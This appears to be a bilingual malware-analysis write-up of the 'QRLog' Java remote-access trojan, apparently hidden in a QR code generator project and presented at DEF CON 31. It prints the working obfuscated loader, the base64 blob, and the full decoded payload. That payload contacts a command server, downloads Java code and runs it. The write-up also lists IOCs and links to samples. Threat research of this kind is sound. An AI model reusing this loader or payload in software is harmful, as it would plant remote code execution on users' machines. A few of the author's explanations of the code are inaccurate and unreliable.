QRLog
======

- [Riding with the Chollimas - QRLog DEF CON 31 Talk](#riding)
- [QRLog Malware Analysis (English)](#english)
- [QRLog Análisis de Malware (Español)](#espanol)

<a name="espanol"></a>
Talk: Riding with the Chollimas
======

## Presentations
|#| Date | Conference |  Link to Video | Link to Slides |
|---|---|---|---|---|
|1|AGO-2023|DEFCON 31 Recon Village| https://www.youtube.com/watch?v=DB6yDJeb6U8 | https://docs.google.com/presentation/d/1mQuauuJCdDI9d_HfIvLdtk_vM4FU4v0AUmlTShV9_hI |


QRLog Malware Analysis
======

- [Español](#espanol)
  - [Introducción](#introduccion)
  - [Comportamiento](#comportamiento)
  - [Análisis de código fuente](#analisis)
  - [IOCs](#indicadores)
  - [Muestras](#muestras)
  - [Referencias](#referencias)
- [English](#english)
  - [Intro](#intro)
  - [Behaviour](#behaviour)
  - [Code Analysis](#analysis)
  - [IOCs](#indicators)
  - [Samples](#samples)
  - [References](#references)

<a name="espanol"></a>
# Español
<a name="introduccion"></a>
## Introducción

En Febrero de 2023 encontré por primera vez una muestra del malware QRLog _in the wild_. Le asigné este nombre debido a que se ocultaba entre los archivos de un generador de códigos QR escrito en Java y crea un archivo con ese mismo nombre para su persistencia.

Es un malware sencillo - y en apariencia, de fabricación casera - de tipo RAT (_Remote Access Tool_) que intenta abrir una _shell reversa_ otorgando al atacante acceso privilegiado al equipo infectado.

Al momento de escribir esta investigación no existen menciones públicas a este malware o a sus componentes, como tampoco detecciones por parte de software antivirus o plataformas de seguridad, lo que nos indica estar ante una muestra novel [[1]](#referencias). Sin embargo algunas plataformas de inteligencia como  CMC (Vietnam) han marcado el enlace original al archivo como sospechoso [[1]](#referencias), y en otras es posible encontrar menciones a parte de su infraestructura C2 (asociada a Cobalt Strike y cuya reutilización es común)[[2][3]](#referencias).

<a name="comportamiento"></a>
## Comportamiento

El proyecto es funcional y no presenta en primera instancia rasgos sospechosos. Sin embargo, un análisis de comportamiento en tiempo de ejecución llevado a cabo por Crowdstrike Falcon detectó - y bloqueó - una serie de acciones potencialmente maliciosas:
- La lectura de la configuración de red mediante el comando `ifconfig`
- El envío de una única solicitud ICMP `ping` a un servidor externo
- La creación de directorios temporales con una serie de números aleatorios en su nombre
- La escritura de un archivo `.java` en el directorio temporal (QRLog.java) y su posterior ejecución
- La escritura de otros archivos con extensiones `.java` y `.dat` en dichos directorios temporales (prefTmp.java, p.dat) y su posterior ejecución
- El borrado de dichos archivos

Ante la inexistencia de material sobre este malware se decidió proceder a un análisis manual. En primera instancia la búsqueda de cadenas de texto que referencien los nombres de los archivos creados arrojó resultados positivos:

```bash
#Buscar "qrlog" en referencia al archivo QRLog.java, primer archivo escrito en las carpetas temporales
> grep -rnwi "qrlog"

[...]/google/zxing/qrcode/QRCodeWriter.java:87:errPath = System.getProperty("java.io.tmpdir")+ "\\QRLog.java";
[...]/google/zxing/qrcode/QRCodeWriter.java:89:errPath = System.getProperty("java.io.tmpdir")+ "/QRLog.java";
```
El archivo `QRCodeWriter.java` es quien crea originalmente el archivo `QRLog.java` y es un buen candidato para comenzar la investigación.
Teniendo una referencia sólida fue posible comenzar el análisis del código Java.

<a name="analisis"></a>
## Análisis de código fuente

Al analizar el archivo `QRCodeWriter.java` (disponible para descargar individualmente en la sección [Muestras](#muestras)) llama inmediatamente la atención la siguiente función:

```java
try{
        String os = System.getProperty("os.name");
        String errPath;
        
        if (os.contains("Windows"))
            errPath = System.getProperty("java.io.tmpdir")+ "\\QRLog.java";
        else
            errPath = System.getProperty("java.io.tmpdir")+ "/QRLog.java";
        FileOutputStream qrW = new FileOutputStream(errPath);
        qrW.write(b64dec);
        Runtime.getRuntime().exec("java " + errPath);
    }
    catch (IOException ex){   
    }
```

En esta función el malware intenta determinar vagamente sobre qué plataforma se estrá trabajando (Windows o Unix), para entender dónde y cómo (con barra invertida o no) escribir un archivo "de log" con extensión `.java`. A este archivo le escribe el contenido de la variable `b64dec` la cual puede encontrarse unas líneas más arriba en el archivo.

```java
byte [] b64dec = Base64.getDecoder().decode(QUIET_ZONE_DATA);
```

Como podemos ver en este fragmento, `b64dec` almacena el resultado de decodificar la variable `QUIET_ZONE_DATA` desde `base64`. Indagando un poco más en el código es posible encontrar el contenido de `QUIET_ZONE_DATA`:

```java
public static String QUIET_ZONE_DATA = "aW1wb3J0IGphdmEuaW8uSU9FeGNlcHRpb247CmltcG9ydCBqYXZhLm5ldC5VUkk7CmltcG9ydCBqYXZhLm5ldC5odHRwLkh0dHBDbGllb"
          + "nQ7CmltcG9ydCBqYXZhLm5ldC5odHRwLkh0dHBSZXF1ZXN0OwppbXBvcnQgamF2YS5uZXQuaHR0cC5IdHRwUmVzcG9uc2U7CmltcG9ydCBqYXZhLm5pby5jaGFyc2V0LlN0YW5"
          + "kYXJkQ2hhcnNldHM7CmltcG9ydCBqYXZhLnV0aWwuQmFzZTY0OwppbXBvcnQgamF2YS51dGlsLlJhbmRvbTsKaW1wb3J0IGphdmEuaW8uQnVmZmVyZWRXcml0ZXI7CmltcG9yd"
          + "CBqYXZhLmlvLkZpbGU7CmltcG9ydCBqYXZhLmlvLkZpbGVXcml0ZXI7CmltcG9ydCBqYXZhLmxhbmcuVGhyZWFkOwoKcHVibGljIGNsYXNzIFFSTG9nIHsKCiAgICBwcml2YXR"
          + "lIHN0YXRpYyBmaW5hbCBTdHJpbmcgUE9TVF9VUkwgPSAiaHR0cHM6Ly93d3cuZ2l0LWh1Yi5tZS92aWV3LnBocCI7CgogICAgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3Rya"
          + "W5nW10gYXJncykgdGhyb3dzIElPRXhjZXB0aW9uewoKICAgICAgICBzZW5kUE9TVCgpOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIFN0cmluZyByYW5kR2VuKCkgdGhyb3d"
          + "zIElPRXhjZXB0aW9uIHsKICAgICAgICBTdHJpbmcgc3RyUG9vbCA9ICIxMjM0NTY3ODkiOwogICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpO"
          + "wogICAgICAgIFJhbmRvbSByYW5kID0gbmV3IFJhbmRvbSgpOwogICAgICAgIAogICAgICAgIGZvciAoaW50IGk9MDsgaTw4OyBpKyspewogICAgICAgICAgICBzYi5hcHBlbmQ"
          + "oc3RyUG9vbC5jaGFyQXQocmFuZC5uZXh0SW50KHN0clBvb2wubGVuZ3RoKCkpKSk7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBzYi50b1N0cmluZygpOwogI"
          + "CAgfQogICAgCiAgICBwcml2YXRlIHN0YXRpYyBTdHJpbmcgZ2V0T3BlcmF0aW5nU3lzdGVtKCkgewogICAgICAgIFN0cmluZyBvcyA9IFN5c3RlbS5nZXRQcm9wZXJ0eSgib3M"
          + "ubmFtZSIpOwogICAgICAgIFN0cmluZyByZXN1bHQgPSBudWxsOwogICAgICAgIAogICAgICAgIGlmIChvcy5jb250YWlucygiV2luZG93cyIpKQogICAgICAgICAgICByZXN1b"
          + "HQgPSAiMCI7CiAgICAgICAgZWxzZSBpZiAob3MuY29udGFpbnMoIkxpbnV4IikpCiAgICAgICAgICAgIHJlc3VsdCA9ICIyIjsKICAgICAgICBlbHNlIGlmIChvcy5jb250YWl"
          + "ucygiTWFjIE9TIFgiKSkKICAgICAgICAgICAgcmVzdWx0ID0gIjEiOwogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9CiAgICAKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgc"
          + "2VuZFBPU1QoKSB0aHJvd3MgSU9FeGNlcHRpb24gewogICAgICAgIFN0cmluZyB1aWQgPSByYW5kR2VuKCk7CiAgICAgICAgU3RyaW5nQnVpbGRlciBkYXRhID0gbmV3IFN0cml"
          + "uZ0J1aWxkZXIoKTsKICAgICAgICBTdHJpbmcgc2VjX3BhdGggPSAiIjsKICAgICAgICBkYXRhLmFwcGVuZCgiR0lUSFVCX1JFUSIpOwogICAgICAgIGRhdGEuYXBwZW5kKHVpZ"
          + "Ck7CiAgICAgICAgZGF0YS5hcHBlbmQoIjIwMDAiKTsKICAgICAgICBkYXRhLmFwcGVuZChnZXRPcGVyYXRpbmdTeXN0ZW0oKSk7CiAgICAgICAgCiAgICAgICAgd2hpbGUgKHR"
          + "ydWUpCiAgICAgICAgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKHNlY19wYXRoLmxlbmd0aCgpID4gMSkgewogICAgICAgICAgICAgICAgICAgIEZpb"
          + "GUgc2VjRmlsZSA9IG5ldyBGaWxlKHNlY19wYXRoKTsKICAgICAgICAgICAgICAgICAgICBpZiAoc2VjRmlsZS5leGlzdHMoKSkKICAgICAgICAgICAgICAgICAgICAgICAgU3l"
          + "zdGVtLmV4aXQoMCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIEh0dHBSZXF1ZXN0IHJlcXVlc3QgPSBIdHRwUmVxdWVzdC5uZ"
          + "XdCdWlsZGVyKCkKICAgICAgICAgICAgICAgICAgICAuaGVhZGVyKCJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD11dGYtOCIpCiAgICAgICAgICA"
          + "gICAgICAgICAgLnZlcnNpb24oSHR0cENsaWVudC5WZXJzaW9uLkhUVFBfMV8xKQogICAgICAgICAgICAgICAgICAgIC51cmkoVVJJLmNyZWF0ZShQT1NUX1VSTCkpCiAgICAgI"
          + "CAgICAgICAgICAgICAgLlBPU1QoSHR0cFJlcXVlc3QuQm9keVB1Ymxpc2hlcnMub2ZTdHJpbmcoZGF0YS50b1N0cmluZygpKSkKICAgICAgICAgICAgICAgICAgICAuYnVpbGQ"
          + "oKTsKICAgICAgICAgICAgICAgIEh0dHBDbGllbnQgY2xpZW50ID0gSHR0cENsaWVudC5uZXdIdHRwQ2xpZW50KCk7CiAgICAgICAgICAgICAgICBIdHRwUmVzcG9uc2U8U3Rya"
          + "W5nPiByZXNwb25zZSA9IGNsaWVudC5zZW5kKHJlcXVlc3QsIEh0dHBSZXNwb25zZS5Cb2R5SGFuZGxlcnMub2ZTdHJpbmcoKSk7CiAgICAgICAgICAgICAgICBpZiAocmVzcG9"
          + "uc2Uuc3RhdHVzQ29kZSgpICE9IDIwMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJlYWQuc2xlZXAoNTAwMCk7CiAgICAgICAgICAgICAgICAgI"
          + "CAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBTdHJpbmcgcmVzU3RyID0gcmVzcG9uc2UuYm9keSgpOwogICAgICAgICAgICAgICAgaWYgKCF"
          + "yZXNTdHIuc3RhcnRzV2l0aCgiR0lUSFVCX1JFUyIpKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbigiRGF0YSBFcnJvc"
          + "iIpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGlmIChyZXNTdHIubGVuZ3RoKCkgPiAxMSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICA"
          + "gICAgICAgICBTdHJpbmcgZW5jX2RhdGEgPSByZXNTdHIuc3Vic3RyaW5nKDEwKTsKICAgICAgICAgICAgICAgICAgICBieXRlIFtdIGRlY19kYXRhID0gQmFzZTY0LmdldERlY"
          + "29kZXIoKS5kZWNvZGUoZW5jX2RhdGEpOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBvcmdfZmlsZSA9IG5ldyBTdHJpbmcoZGVjX2RhdGEsIFN0YW5kYXJkQ2hhcnNldHM"
          + "uVVRGXzgpOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBvcmdfcGF0aDsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpZiAoSW50ZWdlci5wY"
          + "XJzZUludChnZXRPcGVyYXRpbmdTeXN0ZW0oKSkgPT0gMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIG9yZ19wYXRoID0gU3lzdGVtLmd"
          + "ldFByb3BlcnR5KCJqYXZhLmlvLnRtcGRpciIpICsgIlxccHJlZlRtcC5qYXZhIjsKICAgICAgICAgICAgICAgICAgICAgICAgc2VjX3BhdGggPSBTeXN0ZW0uZ2V0UHJvcGVyd"
          + "HkoImphdmEuaW8udG1wZGlyIikgKyAiXFxwLmRhdCI7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgb3JnX3BhdGggPSBTeXN"
          + "0ZW0uZ2V0UHJvcGVydHkoImphdmEuaW8udG1wZGlyIikgKyAiL3ByZWZUbXAuamF2YSI7CiAgICAgICAgICAgICAgICAgICAgICAgIHNlY19wYXRoID0gU3lzdGVtLmdldFByb"
          + "3BlcnR5KCJqYXZhLmlvLnRtcGRpciIpICsgIi9wLmRhdCI7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHRyeSAoRmlsZVdyaXRlciBmaWxlID0"
          + "gbmV3IEZpbGVXcml0ZXIob3JnX3BhdGgsIHRydWUpO0J1ZmZlcmVkV3JpdGVyIGJ1ZmZlciA9IG5ldyBCdWZmZXJlZFdyaXRlcihmaWxlKSkgewogICAgICAgICAgICAgICAgI"
          + "CAgICAgICBidWZmZXIud3JpdGUob3JnX2ZpbGUpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBTdHJpbmcgY21kbGluZSA9ICJqYXZhICIgKyB"
          + "vcmdfcGF0aCArICIgIiArIHVpZCArICIgIiArIFBPU1RfVVJMOwogICAgICAgICAgICAgICAgICAgIFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoY21kbGluZSk7CiAgICAgI"
          + "CAgICAgICAgICAgICAgVGhyZWFkLnNsZWVwKDMwMDApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgVGhyZWFkLnNsZWVwKDUwMDApOwogICAgICAgICAgICB"
          + "9CiAgICAgICAgICAgIH0gY2F0Y2ggKEludGVycnVwdGVkRXhjZXB0aW9uIGV4KSB7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K";
```

Tal como fue comentado es contenido codificado en `base64` el cual será decodificado y posteriormente escrito en un archivo `.java` ubicado en un directorio temporal. 

Decodificando el contenido base64 de esta variable obtenemos el siguiente resultado, que dista mucho de ser un simple archivo de log:

<details>
<summary>Código Java (112 líneas)</summary>

```java
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.lang.Thread;

public class QRLog {

    private static final String POST_URL = "https://www.git-hub.me/view.php";

    public static void main(String[] args) throws IOException{

        sendPOST();
    }

    private static String randGen() throws IOException {
        String strPool = "123456789";
        StringBuilder sb = new StringBuilder();
        Random rand = new Random();
        
        for (int i=0; i<8; i++){
            sb.append(strPool.charAt(rand.nextInt(strPool.length())));
        }
        
        return sb.toString();
    }
    
    private static String getOperatingSystem() {
        String os = System.getProperty("os.name");
        String result = null;
        
        if (os.contains("Windows"))
            result = "0";
        else if (os.contains("Linux"))
            result = "2";
        else if (os.contains("Mac OS X"))
            result = "1";
        return result;
    }
    
    private static void sendPOST() throws IOException {
        String uid = randGen();
        StringBuilder data = new StringBuilder();
        String sec_path = "";
        data.append("GITHUB_REQ");
        data.append(uid);
        data.append("2000");
        data.append(getOperatingSystem());
        
        while (true)
        {
            try {
                if (sec_path.length() > 1) {
                    File secFile = new File(sec_path);
                    if (secFile.exists())
                        System.exit(0);
                }
                
                HttpRequest request = HttpRequest.newBuilder()
                    .header("Content-Type", "application/json; charset=utf-8")
                    .version(HttpClient.Version.HTTP_1_1)
                    .uri(URI.create(POST_URL))
                    .POST(HttpRequest.BodyPublishers.ofString(data.toString()))
                    .build();
                HttpClient client = HttpClient.newHttpClient();
                HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                if (response.statusCode() != 200)
                {
                    Thread.sleep(5000);
                    continue;
                }
                String resStr = response.body();
                if (!resStr.startsWith("GITHUB_RES"))
                {
                    System.out.println("Data Error");
                } else {
                if (resStr.length() > 11)
                {
                    String enc_data = resStr.substring(10);
                    byte [] dec_data = Base64.getDecoder().decode(enc_data);
                    String org_file = new String(dec_data, StandardCharsets.UTF_8);
                    String org_path;
                    
                    if (Integer.parseInt(getOperatingSystem()) == 0)
                    {
                        org_path = System.getProperty("java.io.tmpdir") + "\\prefTmp.java";
                        sec_path = System.getProperty("java.io.tmpdir") + "\\p.dat";
                    } else {
                        org_path = System.getProperty("java.io.tmpdir") + "/prefTmp.java";
                        sec_path = System.getProperty("java.io.tmpdir") + "/p.dat";
                    }
                    try (FileWriter file = new FileWriter(org_path, true);BufferedWriter buffer = new BufferedWriter(file)) {
                        buffer.write(org_file);
                    }
                    String cmdline = "java " + org_path + " " + uid + " " + POST_URL;
                    Runtime.getRuntime().exec(cmdline);
                    Thread.sleep(3000);
                }
                Thread.sleep(5000);
            }
            } catch (InterruptedException ex) {
            }
        }
    }
}
```

</details>

¿Qué acciones realiza este código?

- Importa distintas librerías que le permiten realizar llamadas HTTP, realizar operaciones sobre contenido codificado en base64, manipular archivos, generar números aleatorios y usar hilos (threads).

```java
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.lang.Thread;
```

- Declara una variable String donde almacena una URL maliciosa, seguramente su servidor de Comando y Control (C2).

```java
private static final String POST_URL = "https://www.git-hub.me/view.php";
```

- Declara una String compuesta por ocho números aleatorios, utilizado posteriormente para crear directorios temporales con nombres únicos.

```java
private static String randGen() throws IOException {
  String strPool = "123456789";
  StringBuilder sb = new StringBuilder();
  Random rand = new Random();

  for (int i=0; i<8; i++){
      sb.append(strPool.charAt(rand.nextInt(strPool.length())));
  }

  return sb.toString();
}
```

- Identifica - nuevamente en forma rudimentaria - sobre qué plataforma se está trabajando.

```java
private static String getOperatingSystem() {
  String os = System.getProperty("os.name");
  String result = null;

  if (os.contains("Windows"))
      result = "0";
  else if (os.contains("Linux"))
      result = "2";
  else if (os.contains("Mac OS X"))
      result = "1";
  return result;
}
```

- Crea - pero no envía aún - una solicitud POST hacia el sitio malicioso mencionado anteriormente, consignando un `uid` (User-ID) generado aleatoriamente y el sistema operativo detectado. Disfraza esta información con parámetros como `GITHUB_REQ` para que ante un eventual análisis del tráfico la solicitud aparente ser benigna.

```java
private static void sendPOST() throws IOException {
        String uid = randGen();
        StringBuilder data = new StringBuilder();
        String sec_path = "";
        data.append("GITHUB_REQ");
        data.append(uid);
        data.append("2000");
        data.append(getOperatingSystem());
```

- Revisa la existencia de un archivo "bandera" para saber si esta rutina ha sido ejecutada anteriormente. De no encontrar el archivo, lo crea para indicar haber llevado a cabo una ejecución. Posteriormente envía la solicitud maliciosa en formato JSON al servidor C2 con los datos mencionados en el punto anterior.

```java
try {
  if (sec_path.length() > 1) {
      File secFile = new File(sec_path);
      if (secFile.exists())
          System.exit(0);
  }

  HttpRequest request = HttpRequest.newBuilder()
      .header("Content-Type", "application/json; charset=utf-8")
      .version(HttpClient.Version.HTTP_1_1)
      .uri(URI.create(POST_URL))
      .POST(HttpRequest.BodyPublishers.ofString(data.toString()))
      .build();
  HttpClient client = HttpClient.newHttpClient();
  HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
```

- Si la solicitud no es bien recibida (Código HTTP 200) el malware aguarda 5 segundos. A partir de ahora toda comunicación deberá tener en su contenido el string "GITHUB_RES" indicando que es el C2 quién lo envía. Otras respuestas que no incluyan ese patrón son ignoradas.

```java
if (response.statusCode() != 200)
{
  Thread.sleep(5000);
  continue;
}
String resStr = response.body();
if (!resStr.startsWith("GITHUB_RES"))
{
  System.out.println("Data Error");
} else {
```

- Tras el diálogo inicial con el C2 el malware revisará si la respuesta recibida es mayor a 11 caracters. De ser así, tomará los primeros 10 y los decodificará desde base64 y los pasará a formato UTF-8.

```java
if (resStr.length() > 11)
{
    String enc_data = resStr.substring(10);
    byte [] dec_data = Base64.getDecoder().decode(enc_data);
    String org_file = new String(dec_data, StandardCharsets.UTF_8);
    String org_path;
}

```

- Se crearán dos archivos en los directorios temprales: `p.dat` y `prefTmp.java`. En este último se escrbirán los 10 caracteres recibidos en la solicitud anterior.

```java
if (Integer.parseInt(getOperatingSystem()) == 0)
{
    org_path = System.getProperty("java.io.tmpdir") + "\\prefTmp.java";
    sec_path = System.getProperty("java.io.tmpdir") + "\\p.dat";
} else {
    org_path = System.getProperty("java.io.tmpdir") + "/prefTmp.java";
    sec_path = System.getProperty("java.io.tmpdir") + "/p.dat";
}
try (FileWriter file = new FileWriter(org_path, true);BufferedWriter buffer = new BufferedWriter(file)) {
    buffer.write(org_file);
}
```

- Finalmente el malware ejecutará el comando: `$TEMP/prefTmp.java $UID https://www.git-hub.me/view.php` para generar una shell reversa.

```java
String cmdline = "java " + org_path + " " + uid + " " + POST_URL;
Runtime.getRuntime().exec(cmdline);
Thread.sleep(3000);
```

### Detalles de interés

- Habiendo realizado ingeniería inversa sobre la muestra y entendiendo cómo entabla comunicación con su C2, decidí enviar solicitudes de contacto al mismo con mi alias de Telegram para intentar conseguir una breve entrevista con el grupo. Su respuesta fue un ataque de SSH Bruteforce a gran escala contra la dirección IP desde la que había enviado las solicitudes. Siendo que este equipo contaba en realidad con una honeypot, fue posible registrar toda la infraestructura ofensiva que utilizaron en la operación y volcarla en un pulso de inteligencia [[4]](#referencias). Una versión en texto plano puede descargarse [acá](https://github.com/BirminghamCyberArms/QRLOG/blob/main/iocs/labyrinth_chollima_attack_infrastructure.csv).

- El archivo `inputFiles.lst` contiene información de compilación de Maven. A partir del mismo es posible saber que el autor del malware se hace llamar *Edward* y utiliza una plataforma Windows:
```bash
#[...]
[...]/default-compile/inputFiles.lst:275:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\google\zxing\common\detector\MathUtils.java
[...]/default-compile/inputFiles.lst:276:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\client\result\VEventResultParser.java
[...]/default-compile/inputFiles.lst:277:C:\Users\Edward\Downloads\qr-code-generator-and-reader-master\qr-code-generator-and-reader-master\src\main\java\com\google\zxing\oned\Code128Writer.java
#[...]
  ```

- Esta investigación fue aceptada como Charla para la Recon Village de la DEF CON 31 [[5]](#referencias).

<a name="indicadores"></a>
## IOCs

- [Versión en OpenIOC](https://github.com/birminghamcyberarms/QRLOG/blob/main/iocs/8cdccc15-5563-48bf-9493-7730aa19517c.ioc)
- Versión en texto plano (ver debajo)
- [Infraestructura ofensiva de Labyrinth Chollima](https://github.com/BirminghamCyberArms/QRLOG/blob/main/iocs/labyrinth_chollima_attack_infrastructure.csv)

```
File:QRLog.java
File:prefTmp.java
File:QRCodeGenerator_Java.zip
File:AppleAccount.pdf
File:AppleAccountAgent
File:p.dat
IP:45.77.123.18
IP:3.90.35.35
URL:auth.pxaltonet.org
URL:www.git-hub.me
URI:/file/d/1J6943NKwGIcWHh7lj4o9gJe__9p7F1o7/view
MD5:0fb16054a1486b754d1fcc5c6b6e1b01
MD5:26b7d315dd19eb932a08fe474e0f0c31
```

<a name="muestras"></a>
## Muestras
- Muestra original oculta en un proyecto Java para generar QRs
  - `https://drive.google.com/file/d/1J6943NKwGIcWHh7lj4o9gJe__9p7F1o7/view`
- Mirror de la muestra original
  - [sample.zip](https://github.com/birminghamcyberarms/QRLOG/blob/main/samples/sample.zip)
  - Password: _mauroeldritch_
- Archivo infectado
  - [QRCodeWriter.java](https://github.com/birminghamcyberarms/QRLOG/blob/main/samples/QRCodeWriter.java)

<a name="referencias"></a>
## Referencias
1) [VirusTotal](https://www.virustotal.com/gui/url/da45ab04a24c4473acdecc8288fbaf3c200e82c32525b8378753f41eec3b5493/detection)
2) [AlienVault OTX](https://otx.alienvault.com/indicator/ip/45.77.123.18)
3) [Pulso de inteligencia en AlienVault OTX](https://otx.alienvault.com/pulse/63e50c46063dd5d3a5992804)
4) [Pulso de inteligencia en AlienVault OTX - Actualizado](https://otx.alienvault.com/pulse/64cfcc366fc8f13ce315f39a)
5) [DEF CON 31 - Charla en Recon Village](https://reconvillage.org/recon-village-talks-2023-defcon-31/)

---
  
<a name="english"></a>
# English
<a name="intro"></a>
## Intro

In February 2023 I first encountered a sample of the QRLog malware _in the wild_. I named it like this because it hides itself among the files of a legit QR code generator written in Java, and creates a file with the same name for persistence.

It is a simple RAT (_Remote Access Tool_) malware that attempts to open a _reverse shell_ granting the attacker privileged access to the infected computer.

At the time of writing this research, there are no public mentions of this malware or its components, nor are there any detections by antivirus software or security platforms, which indicates that we are dealing with a novel sample [[1]](#references). However, some intelligence platforms such as CMC (Vietnam) have marked the original link to the file as suspicious [[1]](#references), and in others it is possible to find mentions of part of its C2 infrastructure (associated with Cobalt Strike and whose reuse is common)[[2][3]](#references).

<a name="behaviour"></a>
## Behaviour

The project is functional and does not present suspicious features at first glance. However, a runtime behavior analysis by Crowdstrike Falcon detected - and blocked - a number of potentially malicious actions:
- Reading the network configuration using the `ifconfig` command
- Sending a single ICMP `ping` request to an external server
- Creating temporary directories with a series of random numbers in their name
- The writing of a `.java` file in the temporary directory (QRLog.java) and its subsequent execution
- The writing of other files with `.java` and `.dat` extensions in said temporary directories (prefTmp.java, p.dat) and their subsequent execution
- The deletion of said files

In the absence of material on this malware, it was decided to proceed with a manual analysis. The search for text strings that refer to the names of the created files yielded positive results:

```bash
#Search for "qrlog", referencing QRLog.java file which is created on runtime
> grep -rnwi "qrlog"

[...]/google/zxing/qrcode/QRCodeWriter.java:87:errPath = System.getProperty("java.io.tmpdir")+ "\\QRLog.java";
[...]/google/zxing/qrcode/QRCodeWriter.java:89:errPath = System.getProperty("java.io.tmpdir")+ "/QRLog.java";
```
The `QRCodeWriter.java` file is what originally created the `QRLog.java` file and is a good candidate to start the analysis.
  
<a name="analysis"></a>
## Source Code Analysis

Looking at the `QRCodeWriter.java` file (available for individual download in the [Samples](#samples) section) the following function immediately catches your eye:
  
```java
try{
        String os = System.getProperty("os.name");
        String errPath;
        
        if (os.contains("Windows"))
            errPath = System.getProperty("java.io.tmpdir")+ "\\QRLog.java";
        else
            errPath = System.getProperty("java.io.tmpdir")+ "/QRLog.java";
        FileOutputStream qrW = new FileOutputStream(errPath);
        qrW.write(b64dec);
        Runtime.getRuntime().exec("java " + errPath);
    }
    catch (IOException ex){   
    }
```

In this function, the malware tries to vaguely determine which platform is being used (Windows or Unix), to understand where and how (with backslash or normal slash) to write a "log" file with a `.java` extension. To this file it writes the contents of the `b64dec` variable which can be found a few lines higher in the file.

```java
byte [] b64dec = Base64.getDecoder().decode(QUIET_ZONE_DATA);
```

As we can see in this snippet, `b64dec` stores the result of decoding the `QUIET_ZONE_DATA` variable from `base64`. Digging a little deeper into the code it is possible to find the content of `QUIET_ZONE_DATA`:

```java
public static String QUIET_ZONE_DATA = "aW1wb3J0IGphdmEuaW8uSU9FeGNlcHRpb247CmltcG9ydCBqYXZhLm5ldC5VUkk7CmltcG9ydCBqYXZhLm5ldC5odHRwLkh0dHBDbGllb"
          + "nQ7CmltcG9ydCBqYXZhLm5ldC5odHRwLkh0dHBSZXF1ZXN0OwppbXBvcnQgamF2YS5uZXQuaHR0cC5IdHRwUmVzcG9uc2U7CmltcG9ydCBqYXZhLm5pby5jaGFyc2V0LlN0YW5"
          + "kYXJkQ2hhcnNldHM7CmltcG9ydCBqYXZhLnV0aWwuQmFzZTY0OwppbXBvcnQgamF2YS51dGlsLlJhbmRvbTsKaW1wb3J0IGphdmEuaW8uQnVmZmVyZWRXcml0ZXI7CmltcG9yd"
          + "CBqYXZhLmlvLkZpbGU7CmltcG9ydCBqYXZhLmlvLkZpbGVXcml0ZXI7CmltcG9ydCBqYXZhLmxhbmcuVGhyZWFkOwoKcHVibGljIGNsYXNzIFFSTG9nIHsKCiAgICBwcml2YXR"
          + "lIHN0YXRpYyBmaW5hbCBTdHJpbmcgUE9TVF9VUkwgPSAiaHR0cHM6Ly93d3cuZ2l0LWh1Yi5tZS92aWV3LnBocCI7CgogICAgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3Rya"
          + "W5nW10gYXJncykgdGhyb3dzIElPRXhjZXB0aW9uewoKICAgICAgICBzZW5kUE9TVCgpOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIFN0cmluZyByYW5kR2VuKCkgdGhyb3d"
          + "zIElPRXhjZXB0aW9uIHsKICAgICAgICBTdHJpbmcgc3RyUG9vbCA9ICIxMjM0NTY3ODkiOwogICAgICAgIFN0cmluZ0J1aWxkZXIgc2IgPSBuZXcgU3RyaW5nQnVpbGRlcigpO"
          + "wogICAgICAgIFJhbmRvbSByYW5kID0gbmV3IFJhbmRvbSgpOwogICAgICAgIAogICAgICAgIGZvciAoaW50IGk9MDsgaTw4OyBpKyspewogICAgICAgICAgICBzYi5hcHBlbmQ"
          + "oc3RyUG9vbC5jaGFyQXQocmFuZC5uZXh0SW50KHN0clBvb2wubGVuZ3RoKCkpKSk7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBzYi50b1N0cmluZygpOwogI"
